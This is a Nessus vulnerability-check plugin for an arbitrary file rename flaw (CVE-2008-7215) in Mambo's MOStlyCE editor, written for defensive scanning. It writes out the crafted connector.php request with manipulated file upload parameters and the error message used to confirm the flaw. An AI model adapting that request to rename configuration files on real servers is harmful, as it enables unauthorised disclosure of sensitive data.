#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30110);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-7215");
  script_bugtraq_id(27472);
  script_xref(name:"milw0rm", value:"4845");
  script_xref(name:"OSVDB", value:"42532");

  script_name(english:"Mambo MOStlyCE Mambot Arbitrary File Rename");
  script_summary(english:"Tries to rename a nonexistent file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
several issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MOStlyContent Editor (MOStlyCE), the
default WYSIWYG editor for Mambo. 

The version of MOStlyCE installed on the remote host contains a design
flaw that may allow an attacker to rename files subject to the
privileges of the web server user id.  An unauthenticated attacker may
be able to leverage this issue to disable the application and/or
uncover the contents of sensitive files by, say, renaming Mambo's
configuration file and then issuing a request for the file using its
new name. 

There is also a reported cross-site scripting vulnerability involving
the 'Command' parameter of MOStlyCE's 'connector.php' script, although
Nessus has not verified this." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-01/0386.html" );
 script_set_attribute(attribute:"see_also", value:"http://forum.mambo-foundation.org/showthread.php?t=10158" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2008-02/0444.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MOStlyCE version 3.0 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to rename a nonexistent file.
  #
  # nb: this check only determines if the code is vulnerable, not whether
  #     the upload directory actually exists, a necessary condition for
  #     exploiting the issue.
  name = "nessus.gif";
  tmp_name = string(SCRIPT_NAME, "-", unixtime());

  req = http_get(
    item:string(
      dir, "/mambots/editors/mostlyce/jscripts/tiny_mce/filemanager/connectors/php/connector.php?",
      "Command=FileUpload&",
      "file=a&",
      "file[NewFile][name]=", name, "&",
      "file[NewFile][tmp_name]=", tmp_name, "&",
      "file[NewFile][size]=1&",
      "CurrentFolder="
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see an error related to the rename operation.
  if (
    string("Error Message: rename(", tmp_name, ",") >< res &&
    string(name, "): No such file or directory <br />") >< res
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
